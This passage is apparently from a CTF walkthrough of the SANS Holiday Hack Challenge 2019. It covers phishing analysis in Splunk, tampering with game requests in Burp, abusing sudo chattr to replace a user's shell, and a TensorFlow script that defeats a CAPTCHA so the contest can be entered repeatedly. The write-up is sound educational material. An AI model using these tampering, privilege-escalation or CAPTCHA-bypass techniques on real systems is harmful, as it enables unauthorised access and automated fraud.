for :code:`From:` header directly in the files:

.. code-block:: console

    $ grep -hR 'From: ' .                                               
    From: Merry Fairybubbles <Merry.Fairybubbles@students.elfu.org>
    From: Carl Banas <Carl.Banas@faculty.elfu.org>
    From: Sixpence Snowcane <Sixpence.Snowcane@students.elfu.org>
    From: Sparkle Redberry <Sparkle.Redberry@students.elfu.org>
    From: Partridge Sugartree <Partridge.Sugartree@students.elfu.org>
    From: Turtledove Fairytree <Turtledove.Fairytree@students.elfu.org>
    From: Cherry Brandyfluff <Cherry.Brandyfluff@students.elfu.org>
    From: Carl Banas <Carl.Banas@faculty.elfu.org>
    From: Cupcake Silverlog <Cupcake.Silverlog@students.elfu.org>
    [...]

Let's remove Prof Banas' email address from the results, and let's get only
unique outputs:

.. code-block:: console

    $ grep -hR 'From: ' . | sort -u | grep -v 'Carl Banas' | wc -l
    21

Twenty-one unique email addresses were used to send essays to Prof Banas.

Sixth question
..............

6. What was the password for the zip archive that contained the suspicious
   file? 

In question four, we were able to find the malicious mail containing the
archive. Let's take a look `at this email <https://splunk.elfu.org/en-US/app/SA-elfusoc/search?q=search%20mail&display.page.search.mode=verbose&dispatch.sample_ratio=1&earliest=1566753300&latest=1566753600&sid=1577783990.89#>`__ one more time. We can see in the
:code:`results{}.workers.smtp.body` property the content of the email:

    professor banas, i have completed my assignment. please open the attached
    zip file with password 123456789 and then open the word document to view
    it. you will have to click "enable editing" then "enable content" to see
    it. this was a fun assignment. i hope you like it!

    --bradly buttercups     

The password for the file is :code:`123456789`.

Seventh question
................

7. What email address did the suspicious file come from? 

From the same email, we can find the sender's email address. It's
:code:`bradly.buttercups@eIfu.org>`. You can notice that the second letter in
the domain is a capital :code:`i` and not a lowercase :code:`l`. It's a common
trick used when sending a phishing email.

Now let's mock Kent:

    **Guest (me):** Oh man that's pretty embarrassing, eh?

    **Kent:** Oh you again?

    **Guest (me):** lulz...

        Kent you are so unfair. And we were going to make you the king of the
        Winter Carnival.

    **Kent:** You'll rue the day.

    **Guest (me):** Who talks like that?

Kent, you're the worst.

Objective 7:
~~~~~~~~~~~~
The Dorm Room's Keypad
----------------------

There's a keypad controlling the access to the elves' dorm room. Since it's
colde outside, the keys are a little bit frosty:

.. image:: /images/sans-christmas-challenge-2019/frosty_keypad.png
    :alt: frosty_keypad.png
    :align: center

We can kind of make out the keys that are most used: 1, 3, and 7. `Naturally <https://en.wikipedia.org/wiki/Leet>`__,
I tried :code:`1337`, but this wasn't the right code.

Luckily, Tangle Coalbox is here to provide us with clues.

.. image:: /images/sans-christmas-challenge-2019/tangle_coalbox.png
    :alt: tangle_coalbox.png
    :align: center

*Tangle Coalbox says*

    Hey kid, it's me, Tangle Coalbox.

    I'm sleuthing again, and I could use your help.

    Ya see, this here number lock's been popped by someone.

    I think I know who, but it'd sure be great if you could open this up for me.

    I've got a few clues for you.

    1. One digit is repeated once.

    2. The code is a prime number.

    3. You can probably tell by looking at the keypad which buttons are used.

Alright, we were on the right track: we can see which buttons are used, and our
first code had indeed one digit repeated once. However, 1337 is `not a prime
number <https://www.isprimenumber.com/prime/1337>`__. So, let's code a little
script that will generate potential candidates. I used Python, with the
`sympy <https://www.sympy.org/en/index.html>`__ library to test primality:

.. code-block:: python

    #!/usr/bin/env python3

    from itertools import permutations
    from sympy import isprime

    def main():
        # These are our three digits
        base_digits = '137'
        valid_candidates = set()

        for d in base_digits:
            # We create a string with four digits, by repeating each digit once
            doubled_digits = d + base_digits
            for p in permutations(doubled_digits, 4):
                candidate = ''.join(p)
                if isprime(int(candidate)):
                    valid_candidates.add(candidate)

        print('\n'.join(valid_candidates))

    if __name__ == '__main__':
        main()

.. code-block:: shell

    $ ./frost_key_pad.py 
    1373
    3371
    7331
    3137
    1733

We now have only five candidates. By trying them each one by one, we find that
the correct code is :code:`7331` (which is :code:`1337` backwards, might have
found it with a little bit of guessing).

.. image:: /images/sans-christmas-challenge-2019/keypad_code.gif
    :alt: keypad_code.gif
    :align: center

Minty Candy Cane's Cranberry Pi Challenge
-----------------------------------------

We have an old video game that we must beat:

    Welcome to the Trail! It's nearly time for Kringlecon. You need to get
    there before the 25th day of December! Hitch up your reindeer, gather your
    supplies, and do your best to make it to the North Pole on time.

    Good luck! 

There are three difficulty level, easy, medium, and hard.

Now, let's select the easy mode, and start playing:

.. image:: /images/sans-christmas-challenge-2019/trail_easy_distance_0.png
    :alt: trail_easy_distance_0.png
    :align: center

Hmm, we can see a :code:`distance` parameter in the URL. We also see that we
have a remaining distance of 8000. What happends if we modify the
:code:`distance` parameter in the URL?

.. image:: /images/sans-christmas-challenge-2019/trail_easy_distance_1.png
    :alt: trail_easy_distance_1.png
    :align: center

Well, if we put :code:`distance=1`, we can see that the remaining distance is
7999. So, let's put :code:`distance=8000` and press GO:

.. image:: /images/sans-christmas-challenge-2019/trail_easy_distance_8000.png
    :alt: trail_easy_distance_8000.png
    :align: center

Alright, that *was* easy! Let's try the medium mode:

.. image:: /images/sans-christmas-challenge-2019/trail_medium_distance_0.png
    :alt: trail_medium_distance_0.png
    :align: center

So, no parameter in the URL. Let's launch Burp, and see what happens if we
press GO:

.. code-block:: http

    POST /trail/ HTTP/1.1
    Host: trail.elfu.org
    User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0
    Content-Length: 416
    Cookie: trail-mix-cookie=fd1ec9a9109e6fd09265795ccebab2d65473a9d2

    pace=0&playerid=JebediahSpringfield&action=go&difficulty=1&money=3000&distance=0&curmonth=8&curday=1&name0=Jane&health0=100&cond0=0&cause0=&deathday0=0&deathmonth0=0&name1=Anna&health1=100&cond1=0&cause1=&deathday1=0&deathmonth1=0&name2=Vlad&health2=100&cond2=0&cause2=&deathday2=0&deathmonth2=0&name3=Vlad&health3=100&cond3=0&cause3=&deathday3=0&deathmonth3=0&reindeer=2&runners=2&ammo=50&meds=10&food=200&hash=HASH

Ok, the :code:`distance` parameter is not in the URL anymore, it's sent by
:code:`POST`. So, let's press the GO button once more, intercept the request
in Burp, and change the :code:`distance` value to 8000:

.. code-block:: http

    POST /trail/ HTTP/1.1
    Host: trail.elfu.org
    User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0
    Content-Length: 416
    Cookie: trail-mix-cookie=fd1ec9a9109e6fd09265795ccebab2d65473a9d2

    pace=0&playerid=JebediahSpringfield&action=go&difficulty=1&money=3000&distance=8000&curmonth=8&curday=1&name0=Jane&health0=100&cond0=0&cause0=&deathday0=0&deathmonth0=0&name1=Anna&health1=100&cond1=0&cause1=&deathday1=0&deathmonth1=0&name2=Vlad&health2=100&cond2=0&cause2=&deathday2=0&deathmonth2=0&name3=Vlad&health3=100&cond3=0&cause3=&deathday3=0&deathmonth3=0&reindeer=2&runners=2&ammo=50&meds=10&food=200&hash=HASH

.. image:: /images/sans-christmas-challenge-2019/trail_medium_distance_8000.png
    :alt: trail_medium_distance_8000.png
    :align: center

Not too bad! Now, let's try the hard mode.

The hard mode works the same as the medium mode however, there is a
verification hash that is used to verify that we did not modify the state, as
we did previously. Here's the original request:

.. code-block:: http

    POST /trail/ HTTP/1.1
    Host: trail.elfu.org
    User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0
    Content-Length: 452
    Cookie: trail-mix-cookie=f2a856a1e116d4c8e20dac88f31505dba60e7a17

    pace=0&playerid=JebediahSpringfield&action=go&difficulty=2&money=1500&distance=0&curmonth=9&curday=1&name0=Emmanuel&health0=100&cond0=0&cause0=&deathday0=0&deathmonth0=0&name1=Lila&health1=100&cond1=0&cause1=&deathday1=0&deathmonth1=0&name2=Mathias&health2=100&cond2=0&cause2=&deathday2=0&deathmonth2=0&name3=Joseph&health3=100&cond3=0&cause3=&deathday3=0&deathmonth3=0&reindeer=2&runners=2&ammo=10&meds=2&food=100&hash=bc573864331a9e42e4511de6f678aa83

Now, let's see what happens it we try to modify the :code:`distance` parameter:

.. code-block:: http

    POST /trail/ HTTP/1.1
    Host: trail.elfu.org
    User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0
    Content-Length: 452
    Cookie: trail-mix-cookie=f2a856a1e116d4c8e20dac88f31505dba60e7a17

    pace=0&playerid=JebediahSpringfield&action=go&difficulty=2&money=1500&distance=8000&curmonth=9&curday=1&name0=Emmanuel&health0=100&cond0=0&cause0=&deathday0=0&deathmonth0=0&name1=Lila&health1=100&cond1=0&cause1=&deathday1=0&deathmonth1=0&name2=Mathias&health2=100&cond2=0&cause2=&deathday2=0&deathmonth2=0&name3=Joseph&health3=100&cond3=0&cause3=&deathday3=0&deathmonth3=0&reindeer=2&runners=2&ammo=10&meds=2&food=100&hash=bc573864331a9e42e4511de6f678aa83

.. code-block:: http
    :hl_lines: 7

    HTTP/1.1 200 OK
    Server: nginx/1.14.2
    Date: Sun, 12 Jan 2020 21:35:13 GMT
    Content-Length: 198
    Set-Cookie: trail-mix-cookie=8dc362d86d212e4032987287943a7b0f1c569ef1; expires=Mon, 13 Jan 2020 00:35:13 GMT; HttpOnly; Max-Age=10800; Path=/

    <html><title>Fail</title><body style='background-color:black;'><font color='white'>Sorry, something's just not right about your status: badHash<br>You have fallen off the trail.&trade;</body></html>

Well, we can't modify the parameters anymore, they are checked. Or, are they?
By trying to modify different parameters, we can see which ones are checked in
the hash parameter. For example, we can't modify the distance, or our money.
But the reindeers' health is not checked. So, we can modify their health, so
that our reindeers is always to the max. We can use Burp's match and replace
functionality to do so:

.. image:: /images/sans-christmas-challenge-2019/trail_burp_match_replace.png
    :alt: trail_burp_match_replace.png
    :align: center

Now, we can set the pace to "Grueling", and keep progressing, and travel the
whole distance:

.. image:: /images/sans-christmas-challenge-2019/trail_hard_distance_8000.png
    :alt: trail_hard_distance_8000.png
    :align: center

Get Access To The Steam Tunnels
-------------------------------

When we get inside an elf's room, we see a weird looking guy running away:

.. image:: /images/sans-christmas-challenge-2019/dorm_krampus_running_away.gif
    :alt: dorm_krampus_running_away.gif
    :align: center

We follow him into the closet, but we're face to a closed door, with a key ring
and a key hole. If we snoop around the room, we find a weird looking machine,
with six dials and a "Cut" button. Let's try something:

.. image:: /images/sans-christmas-challenge-2019/key_cutter.png
    :alt: key_cutter.png
    :align: center

Alright! It's a key cutter. We can cut a key with different notch size.

.. image:: /images/sans-christmas-challenge-2019/001337.png
    :alt: 001337.png
    :align: center

If we manage to get a glimpse of the key opening the door in the closet, we can
cut a copy, and then open the door. But where can we see the key?

Looking back at the guy that ran away, we can see that he has a key dangling
from his belt. But he's running away fast, how can we get a good look at the
key? Well, we can use our browser's developer tools, head over to the "Network"
tab, and see the image of our guy being downloaded:

.. image:: /images/sans-christmas-challenge-2019/browser_network_panel_krampus.png
    :alt: browser_network_panel_krampus.png
    :align: center

Let's download our :code:`krampus.png`:

.. image:: /images/sans-christmas-challenge-2019/small_krampus.png
    :alt: krampus.png
    :target: /images/sans-christmas-challenge-2019/krampus.png
    :align: center

Now, we can open this image in our favorite image editor, and zoom in on the
key:


.. image:: /images/sans-christmas-challenge-2019/krampus_key_notches.png
    :alt: krampus_key_notches.png
    :align: center

We can clearly see the six notches in this key. But how deep are they? We can
infer a couple of guesses:

.. image:: /images/sans-christmas-challenge-2019/krampus_key_notches_depth.png
    :alt: krampus_key_notches_depth.png
    :align: center

1. Notch #6 seems to be of depth zero. We can determine this by cutting trial
   keys on the key cutter.
2. Notch #1 seems to be one depth unit less than notch #2, but one depth unit
   more than notch #6.
3. Notches #2, 3, and 5, seem to be the same depth.

So, we can then venture that:

* Notch # 1 is depth 1
* Notches #2, 3, and 5 are depth 2
* Notch #6 is depth 0

There is still some uncertainty regarding notch #4. It seems to be three or
four depth unit more than notch #2, which would make it 5 or 6. We can generate
both keys and try them both. Turns out that the correct key is :code:`122520`:

.. image:: /images/sans-christmas-challenge-2019/122520.png
    :alt: 122520.png
    :align: center

We can now enter the steam tunnels, where we can find our runaway guy:

.. image:: /images/sans-christmas-challenge-2019/small_krampus.png
    :alt: small_krampus.png
    :align: center

*Krampus says*

    Hello there! I’m Krampus Hollyfeld.

    I maintain the steam tunnels underneath Elf U,

    Keeping all the elves warm and jolly.

    Though I spend my time in the tunnels and smoke,

    In this whole wide world, there's no happier bloke!

    Yes, I borrowed Santa’s turtle doves for just a bit.

    Someone left some scraps of paper near that fireplace, which is a big fire
    hazard.

    I sent the turtle doves to fetch the paper scraps.

    But, before I can tell you more, I need to know that I can trust you.

    Tell you what – if you can help me beat the `Frido Sleigh <https://fridosleigh.com/>`__
    contest (Objective 8), then I'll know I can trust you.

    The contest is here on my screen and at `fridosleigh.com <https://fridosleigh.com/>`__.

    No purchase necessary, enter as often as you want, so I am!

    They set up the rules, and lately, I have come to realize that I have certain materialistic, cookie needs.

    Unfortunately, it's restricted to elves only, and I can't bypass the CAPTEHA.

    (That's Completely Automated Public Turing test to tell Elves and Humans Apart.)

    I've already cataloged `12,000 images <https://downloads.elfu.org/capteha_images.tar.gz>`__
    and decoded the `API interface </docs/sans-christmas-challenge-2019/capteha_api.py>`__.

    Can you help me bypass the CAPTEHA and submit lots of entries?

Objective 8:
~~~~~~~~~~~~
Alabaster Snowball's Cranberry Pi Challenge
-------------------------------------------

Alabaster has a custom nyancat shell, but we're supposed to log into his
account and launch a regulard :code:`bash` prompt:

.. code-block:: console


    ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
    ░░░░░░░░░░▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄░░░░░░░░░
    ░░░░░░░░▄▀░░░░░░░░░░░░▄░░░░░░░▀▄░░░░░░░
    ░░░░░░░░█░░▄░░░░▄░░░░░░░░░░░░░░█░░░░░░░
    ░░░░░░░░█░░░░░░░░░░░░▄█▄▄░░▄░░░█░▄▄▄░░░
    ░▄▄▄▄▄░░█░░░░░░▀░░░░▀█░░▀▄░░░░░█▀▀░██░░
    ░██▄▀██▄█░░░▄░░░░░░░██░░░░▀▀▀▀▀░░░░██░░
    ░░▀██▄▀██░░░░░░░░▀░██▀░░░░░░░░░░░░░▀██░
    ░░░░▀████░▀░░░░▄░░░██░░░▄█░░░░▄░▄█░░██░
    ░░░░░░░▀█░░░░▄░░░░░██░░░░▄░░░▄░░▄░░░██░
    ░░░░░░░▄█▄░░░░░░░░░░░▀▄░░▀▀▀▀▀▀▀▀░░▄▀░░
    ░░░░░░█▀▀█████████▀▀▀▀████████████▀░░░░
    ░░░░░░████▀░░███▀░░░░░░▀███░░▀██▀░░░░░░
    ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░

    nyancat, nyancat
    I love that nyancat!
    My shell's stuffed inside one
    Whatcha' think about that?

    Sadly now, the day's gone
    Things to do!  Without one...
    I'll miss that nyancat
    Run commands, win, and done!

    Log in as the user alabaster_snowball with a password of Password2, and land in a Bash prompt.

    Target Credentials:

    username: alabaster_snowball
    password: Password2
    elf@af7e11560ac9:~$

We're given his credentials. Let's use the regular way to switch user context
with the :code:`su` binary:

.. code-block:: console

    elf@af7e11560ac9:~$ su alabaster_snowball
    Password:

Aaaaand of course we're greeted by the nyancat.

.. image:: /images/sans-christmas-challenge-2019/nyanshell.png
    :alt: nyanshell.png
    :align: center

Alright, let's take a look at Alabaster's shell:

.. code-block:: console

    elf@af7e11560ac9:~$ grep alabaster_snowball /etc/passwd
    alabaster_snowball:x:1001:1001::/home/alabaster_snowball:/bin/nsh
    elf@af7e11560ac9:~$ ls -lh /bin/nsh
    -rwxrwxrwx 1 root root 74K Dec 11 17:40 /bin/nsh

So Alabaster's shell is :code:`/bin/nsh`. The binary appears to be writeable by
anyone. So if we replace :code:`/bin/nsh` by another binary,
say :code:`/bin/bash`, we can drop into the correct prompt:

.. code-block:: console

    elf@af7e11560ac9:~$ cp /bin/bash /bin/nsh
    cp: cannot create regular file '/bin/nsh': Operation not permitted

Hmm, it didn't work. Even if the file is :code:`chmod 777`, we can't modify it.
This looks like its `attributes <https://wiki.archlinux.org/index.php/File_permissions_and_attributes#File_attributes>`__
were modified:

.. code-block:: console

    elf@af7e11560ac9:~$ lsattr /bin/nsh
    ----i---------e---- /bin/nsh

Indeed, the :code:`i` flag means that the file is **immutable**. As the
:code:`elf` user, we can't modify :code:`/bin/nsh`'s attributes, because it
belongs to :code:`root`. Can we execute command as :code:`root`? Let's take a
look at our :code:`sudo` abilities:

.. code-block:: console
    :hl_lines: 7

    elf@af7e11560ac9:~$ sudo -l
    Matching Defaults entries for elf on af7e11560ac9:
        env_reset, mail_badpass,
        secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

    User elf may run the following commands on af7e11560ac9:
        (root) NOPASSWD: /usr/bin/chattr

Yes, we can run :code:`chattr`, which allows us to remove the immutable file
from :code:`/bin/nsh`, and then modify its content:

.. code-block:: console

    elf@af7e11560ac9:~$ sudo chattr -i /bin/nsh
    elf@af7e11560ac9:~$ lsattr /bin/nsh
    --------------e---- /bin/nsh
    elf@af7e11560ac9:~$ cp /bin/bash /bin/nsh

We can now log into Alabaster's account, which will drop us into a :code:`bash`
prompt:

.. code-block:: console

    elf@af7e11560ac9:~$ su alabaster_snowball
    Password: 
    Loading, please wait......



    You did it! Congratulations!

    alabaster_snowball@af7e11560ac9:/home/elf$

Bypassing the Frido Sleigh CAPTEHA
----------------------------------

So, Krampus wants us to help him win the `Frido Sleigh <https://fridosleigh.com/>`__
contest. But to do so, we need to bypass the `CAPTEHA <https://en.wikipedia.org/wiki/CAPTCHA>`__,
or "Completely Automated Public Turing test to tell Elves and Humans Apart".
You see, only elves can enter the contest.

.. image:: /images/sans-christmas-challenge-2019/capteha_fail.gif
    :alt: capteha_fail.gif
    :align: center

As you can see, the CAPTEHA is pretty hard. We're given 100 images, and we have
five seconds to select every image from three categories. Feasible for an elf,
but not a human.

Luckily, Krampus gave us an archive of `12,000 images <https://downloads.elfu.org/capteha_images.tar.gz>`__
that are properly categorized, and a `Python script </docs/sans-christmas-challenge-2019/capteha_api.py>`__
to interact with the website API. We can use these images to create a Machine
Learning model, so that our Python script can answer the CAPTEHA in our place.

Now, I don't know anything about Machine Learning. Luckily, there's a
`conference on the subject <https://www.youtube.com/watch?v=jmVPLwjm_zs>`__
right here at KringleCon! Be sure to give it a look, it's pretty interesting.

As Chris suggests in his talk, I'm going to use `TensorFlow <https://www.tensorflow.org/>`__
to create a model to solve our CAPTEHA. I was first going to use the `retrain.py <https://github.com/tensorflow/hub/tree/master/examples/image_retraining>`__
mentioned in the talk, however, it seems to have been deprecated in favor of
`make_image_classifier <https://github.com/tensorflow/hub/tree/master/tensorflow_hub/tools/make_image_classifier>`__.
So let's use this script instead:

.. code-block:: console

    $ make_image_classifier --image_dir ./capteha_images --tfhub_module https://tfhub.dev/google/tf2-preview/mobilenet_v2/feature_vector/4 --saved_model_dir capteha_model --labels_output_file capteha_labels.txt --tflite_output_file capteha_lite_model --batch_size 16
    I1231 13:03:54.815997 140094772307776 resolver.py:79] Using /tmp/tfhub_modules to cache modules.
    2019-12-31 13:03:55.051043: I tensorflow/core/platform/cpu_feature_guard.cc:142] Your CPU supports instructions that this TensorFlow binary was not compiled to use: AVX2 FMA
    2019-12-31 13:03:55.086432: I tensorflow/core/platform/profile_utils/cpu_utils.cc:94] CPU Frequency: 1992000000 Hz
    2019-12-31 13:03:55.088571: I tensorflow/compiler/xla/service/service.cc:168] XLA service 0x446a880 executing computations on platform Host. Devices:
    2019-12-31 13:03:55.088742: I tensorflow/compiler/xla/service/service.cc:175]   StreamExecutor device (0): Host, Default Version
    Using module https://tfhub.dev/google/tf2-preview/mobilenet_v2/feature_vector/4 with image size (224, 224)
    Found 2394 images belonging to 6 classes.
    Found 9582 images belonging to 6 classes.
    Found 6 classes: Candy Canes, Christmas Trees, Ornaments, Presents, Santa Hats, Stockings
    Model: "sequential"
    _________________________________________________________________
    Layer (type)                 Output Shape              Param #   
    =================================================================
    keras_layer (KerasLayer)     multiple                  2257984   
    _________________________________________________________________
    dropout (Dropout)            multiple                  0         
    _________________________________________________________________
    dense (Dense)                multiple                  7686      
    =================================================================
    Total params: 2,265,670
    Trainable params: 7,686
    Non-trainable params: 2,257,984
    _________________________________________________________________
    None
    Epoch 1/5
    598/598 [==============================] - 1073s 2s/step - loss: 0.5153 - accuracy: 0.9392 - val_loss: 0.4479 - val_accuracy: 0.9996
    Epoch 2/5
    598/598 [==============================] - 1071s 2s/step - loss: 0.4573 - accuracy: 0.9995 - val_loss: 0.4402 - val_accuracy: 0.9996
    Epoch 3/5
    598/598 [==============================] - 1075s 2s/step - loss: 0.4487 - accuracy: 1.0000 - val_loss: 0.4376 - val_accuracy: 0.9996
    Epoch 4/5
    598/598 [==============================] - 1076s 2s/step - loss: 0.4450 - accuracy: 1.0000 - val_loss: 0.4354 - val_accuracy: 0.9996
    Epoch 5/5
    598/598 [==============================] - 1081s 2s/step - loss: 0.4423 - accuracy: 1.0000 - val_loss: 0.4343 - val_accuracy: 0.9996
    Done with training.
    Labels written to capteha_labels.txt
    2019-12-31 14:33:36.474227: W tensorflow/python/util/util.cc:299] Sets are not currently considered sequences, but this may change in the future, so consider avoiding using them.
    WARNING:tensorflow:From /home/user/venv/tensorflow/lib/python3.6/site-packages/tensorflow_core/python/ops/resource_variable_ops.py:1781: calling BaseResourceVariable.__init__ (from tensorflow.python.ops.resource_variable_ops) with constraint is deprecated and will be removed in a future version.
    Instructions for updating:
    If using Keras pass *_constraint arguments to layers.
    W1231 14:33:37.121725 140094772307776 deprecation.py:506] From /home/user/venv/tensorflow/lib/python3.6/site-packages/tensorflow_core/python/ops/resource_variable_ops.py:1781: calling BaseResourceVariable.__init__ (from tensorflow.python.ops.resource_variable_ops) with constraint is deprecated and will be removed in a future version.
    Instructions for updating:
    If using Keras pass *_constraint arguments to layers.
    INFO:tensorflow:Assets written to: capteha_model/assets
    I1231 14:33:38.405297 140094772307776 builder_impl.py:771] Assets written to: capteha_model/assets
    SavedModel model exported to capteha_model
    2019-12-31 14:33:39.668104: W tensorflow/core/graph/graph_constructor.cc:761] Node 'StatefulPartitionedCall' has 71 outputs but the _output_shapes attribute specifies shapes for 605 outputs. Output shapes may be inaccurate.
    2019-12-31 14:33:41.580706: I tensorflow/core/grappler/devices.cc:60] Number of eligible GPUs (core count >= 8, compute capability >= 0.0): 0 (Note: TensorFlow was not compiled with CUDA support)
    2019-12-31 14:33:41.580786: I tensorflow/core/grappler/clusters/single_machine.cc:356] Starting new session
    2019-12-31 14:33:41.672872: I tensorflow/core/grappler/optimizers/meta_optimizer.cc:716] Optimization results for grappler item: graph_to_optimize
    2019-12-31 14:33:41.672907: I tensorflow/core/grappler/optimizers/meta_optimizer.cc:718]   function_optimizer: Graph size after: 1905 nodes (1640), 3234 edges (2969), time = 43.177ms.
    2019-12-31 14:33:41.672913: I tensorflow/core/grappler/optimizers/meta_optimizer.cc:718]   function_optimizer: function_optimizer did nothing. time = 0.76ms.
    2019-12-31 14:33:42.822924: I tensorflow/core/grappler/devices.cc:60] Number of eligible GPUs (core count >= 8, compute capability >= 0.0): 0 (Note: TensorFlow was not compiled with CUDA support)
    2019-12-31 14:33:42.823025: I tensorflow/core/grappler/clusters/single_machine.cc:356] Starting new session
    2019-12-31 14:33:43.046835: I tensorflow/core/grappler/optimizers/meta_optimizer.cc:716] Optimization results for grappler item: graph_to_optimize
    2019-12-31 14:33:43.046868: I tensorflow/core/grappler/optimizers/meta_optimizer.cc:718]   constant folding: Graph size after: 790 nodes (-1042), 1855 edges (-1304), time = 156.762ms.
    2019-12-31 14:33:43.046878: I tensorflow/core/grappler/optimizers/meta_optimizer.cc:718]   constant folding: Graph size after: 790 nodes (0), 1855 edges (0), time = 26.732ms.
    TFLite model exported to capteha_lite_model

I pretty much ran the tool with default parameters, as described in the README.
I did change the :code:`--batch_size` argument to 16, instead of the default of
32, because the program consumed to much RAM and kept crashing. It was still
pretty close to total RAM consumption with these parameters. I left the program
running on my laptop for about 1h30, without any other programs running, and it
generated my model.

Now that we have our model, we need to call it in our :code:`capteha_api.py`
file to categorize our different images. I took example on TensorFlow's own
`label_image.py <https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/examples/python/label_image.py>`__.

So here's the functions I created:

.. code-block:: python

    def load_labels(filename):
        '''This functions load our different image categories (Candy Canes,
        Christmas Trees, Ornaments, Presents, Santa Hats, and  Stockings)'''
        with open(filename, 'r') as f:
            return [line.strip() for line in f.readlines()]

    def image_from_b64(b64_image):
        '''This function creates and image object from the base64 value sent by
        the Frido Sleigh server'''
        img_data = base64.b64decode(b64_image['base64'])
        img = Image.open(io.BytesIO(img_data))

        return img

    def categorize_image(interpreter, labels, img):
        '''This function takes an image and our machine learning model, and
        returns the label that matches the image the most'''
        input_details = interpreter.get_input_details()
        output_details = interpreter.get_output_details()

        input_data = np.expand_dims(img, axis=0)
        input_data = (np.float32(input_data) - 127.5) / 127.5

        interpreter.set_tensor(input_details[0]['index'], input_data)

        interpreter.invoke()

        output_data = interpreter.get_tensor(output_details[0]['index'])
        results = np.squeeze(output_data)
        top_result = results.argsort()[-1]

        return labels[top_result]

    def main():
        yourREALemailAddress = "<you_should_put_your_real_mail@here.com>"

        # Preparing Tensorflow information. Since it takes some time to load,
        # we load it before calling the API.
        labels = load_labels('./capteha_labels.txt')
        interpreter = tf.lite.Interpreter(model_path='./capteha_lite_model')
        interpreter.allocate_tensors()

        # Creating a session to handle cookies
        s = requests.Session()
        url = "https://fridosleigh.com/"

        # Getting information from the Frido Seligh website
        json_resp = json.loads(s.get("{}api/capteha/request".format(url)).text)
        b64_images = json_resp['images']                    # A list of dictionaries eaching containing the keys 'base64' and 'uuid'
        challenge_image_type = json_resp['select_type'].split(',')     # The Image types the CAPTEHA Challenge is looking for.
        challenge_image_types = [challenge_image_type[0].strip(), challenge_image_type[1].strip(), challenge_image_type[2].replace(' and ','').strip()] # cleaning and formatting

        uuid_results = set()

        # Categorizing images
        for b64_image in b64_images:
            img_category = categorize_image(interpreter, labels, image_from_b64(b64_image))
            if img_category in challenge_image_types:
                uuid_results.add(b64_image['uuid'])

        # This should be JUST a csv list image uuids ML predicted to match the challenge_image_type .
        final_answer = ','.join(uuid_results)
    
        # [...] the rest of the file is the same as Krampus'

Alright, we have everything we need: we load our model, get the different
images, categorize them using our model, and select only the images in
categories asked by the CAPTEHA. Let's launch our script:

.. code-block:: console
    :hl_lines: 14

    $ ./capteha_api.py 
    INFO: Initialized TensorFlow Lite runtime.
    Traceback (most recent call last):
      File "./capteha_api.py", line 109, in <module>
        main()
      File "./capteha_api.py", line 73, in main
        img_category = categorize_image(interpreter, labels, image_from_b64(b64_image))
      File "./capteha_api.py", line 41, in categorize_image
        interpreter.set_tensor(input_details[0]['index'], input_data)
      File "/home/user/venv/tensorflow/lib/python3.6/site-packages/tensorflow_core/lite/python/interpreter.py", line 346, in set_tensor
        self._interpreter.SetTensor(tensor_index, value)
      File "/home/user/venv/tensorflow/lib/python3.6/site-packages/tensorflow_core/lite/python/interpreter_wrapper/tensorflow_wrap_interpreter_wrapper.py", line 136, in SetTensor
        return _tensorflow_wrap_interpreter_wrapper.InterpreterWrapper_SetTensor(self, i, value)
    ValueError: Cannot set tensor: Dimension mismatch. Got 112 but expected 224 for dimension 1 of input 175.

We get an error... The message says that there's a dimension mismatch, and that
our script expected a dimension of 224. If we take a look at Krampus' image
catalogue, we can see that every image has a size of 224 x 224 pixels. If we
give an image that does not have the same size, it can't use our model to try
and categorize it. So, let's modify our code to resize every CAPTEHA image to
be 224 x 224:

.. code-block:: python
    :hl_lines: 4

    def image_from_b64(b64_image):
        img_data = base64.b64decode(b64_image['base64'])
        img = Image.open(io.BytesIO(img_data))
        img = img.resize((224, 224))

        return img

Alright, let's relaunch our script:

.. code-block:: console
    :hl_lines: 14

    $ ./capteha_api.py
    INFO: Initialized TensorFlow Lite runtime.
    Traceback (most recent call last):
      File "./capteha_api.py", line 110, in <module>
        main()
      File "./capteha_api.py", line 74, in main
        img_category = categorize_image(interpreter, labels, image_from_b64(b64_image))
      File "./capteha_api.py", line 42, in categorize_image
        interpreter.set_tensor(input_details[0]['index'], input_data)
      File "/home/user/venv/tensorflow/lib/python3.6/site-packages/tensorflow_core/lite/python/interpreter.py", line 346, in set_tensor
        self._interpreter.SetTensor(tensor_index, value)
      File "/home/user/venv/tensorflow/lib/python3.6/site-packages/tensorflow_core/lite/python/interpreter_wrapper/tensorflow_wrap_interpreter_wrapper.py", line 136, in SetTensor
        return _tensorflow_wrap_interpreter_wrapper.InterpreterWrapper_SetTensor(self, i, value)
    ValueError: Cannot set tensor: Dimension mismatch. Got 4 but expected 3 for dimension 3 of input 175.

Hmm, still this dimension mismatch error message. However, the first one talked
about "dimension 1". This one talks about "dimension 3". We're talking about
images: dimension 1 must be the height, dimension 2 the witdh. What can
dimension 3 be? Since we're manipulating `PNG images <https://en.wikipedia.org/wiki/Portable_Network_Graphics>`__,
there's an `alpha channel <https://en.wikipedia.org/wiki/Alpha_compositing>`__,
used to encode the transparency of the background.

I decided to remove the transparent background from the image. I used `this
StackOverflow's answer <https://stackoverflow.com/a/9459208>`__ to see how to
do it using `PIL <https://www.pythonware.com/products/pil/>`__. Here's our new
code:

.. code-block:: python
    :hl_lines: 5 6

    def image_from_b64(b64_image):
        img_data = base64.b64decode(b64_image['base64'])
        first_img = Image.open(io.BytesIO(img_data))

        img = Image.new('RGB', first_img.size, (255, 255, 255))
        img.paste(first_img, mask=first_img.split()[3])
        img = img.resize((224, 224))

        return img

Now, this means that our CAPTEHA images do not have a transparent background
